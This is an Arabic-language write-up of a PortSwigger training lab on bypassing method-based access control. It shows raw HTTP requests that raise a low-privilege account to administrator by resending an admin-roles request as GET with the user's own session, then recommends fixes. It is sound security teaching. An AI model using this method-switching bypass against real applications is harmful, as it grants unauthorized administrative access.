# [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

## **`الهدف`**
الدخول بحساب `wiener:peter` وترقية حسابك إلى مدير `(administrator).`
## **`خطوات الحل`**
لحل هذا اللاب بالطريقة الرسمية الموضحة في الـ `PortSwigger`، نقوم بالدخول إلى حساب `administrator:admin` ثم إلى لوحة التحكم، ونقوم برفع صلاحيات حساب `carlos` ثم اعتراض هذا الـ `request` وتوجيهه إلى الـ `repeater`
```http
POST /admin-roles HTTP/2
Host: 0ae7004b03d69cda8044d01f00cd00d5.web-security-academy.net
Cookie: session=IhJfQMGP7zCWWN7dqPtLEa6BFF9gMzPW

username=carlos&action=upgrade
```

ثم نخرج من الحساب ونقوم بالدخول إلى حساب `wiener:peter` ونقوم بنسخ الـ `Session` الخاصة به من أى `request` ومن ثم نقوم بوضعها في الـ `request` الموجود لدينا في الـ `repeater` من حساب `administrator:admin` ونقوم بتعديل الـ `username=carlos` إلى `wiener` وتعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح الـ `request` كالتالي ونقوم بتمريره ليتم رفع صلاحيات الحساب وننتهي من حل اللاب.
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ae7004b03d69cda8044d01f00cd00d5.web-security-academy.net
Cookie: session=9EQ1H0CaRonop19psBAWLCyAzmSuvSFB
```

لكن الطريقة التى قمت بحل اللاب بها كانت أبسط وهي عن طريق الدخول إلى حساب `wiener:peter` فقط، دون الحاجة لدخول حساب `administrator:admin` قبلها، ونضغط على `my account` ونعترض الـ `requets` ونعدل السطر الأول منه ( لا يُشترط أن يكون هذا الـ `request`، فأي `request` سيؤدي الغرض) ليصبح`GET /admin-roles?username=wiener&action=upgrade`.
```http
GET /admin-roles?username=wiener&action=upgrade
Host: 0ae7004b03d69cda8044d01f00cd00d5.web-security-academy.net
Cookie: session=9EQ1H0CaRonop19psBAWLCyAzmSuvSFB
```

ونقوم بتمريره لنجد أنه تم رفع صلاحيات الحساب إلى مدير وننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء كبير من ترقيع لاب`** [Unprotected admin functionality](./Unprotected-admin-functionality.md)

فيجب  تقييد الـ `Method` المسموحة بشكل صارم، وإجبار الـ `Endpoint` على استقبال `Method` الـ `Post` فقط، وإذا تم إرسال أى `Method` أخرى يجب على السيرفر فورًا رفض الـ `request` وإرجاع خطأ برقم `405 Method Not Allowed`

ويجب إتباع مبدأ الرفض التلقائي، فالصحيح هو أن يرفض الكود كل شئ بشكل تلقائي ويستم فقط بحالات مُحددة جدًا، وإذا لم يكن الـ `request` متطابق بنسبة `100%` مع المعايير المطلوبة بما فيها نوع الـ `Method` يتم رميه `Drop` فورًا.
